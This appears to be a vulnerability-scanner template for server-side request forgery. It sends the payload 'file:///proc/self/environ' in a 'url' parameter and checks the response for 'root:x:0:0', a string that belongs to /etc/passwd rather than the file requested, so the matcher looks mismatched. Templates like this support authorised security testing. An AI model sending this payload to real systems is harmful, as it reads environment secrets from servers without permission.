id: ssrf4-13
name: 'SSRF scheme file via url'
severity: high
type: active
tags:
  - ssrf
  - oob
  - scheme
description: 'Fetches file URL via url (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      url:
        - 'file:///proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
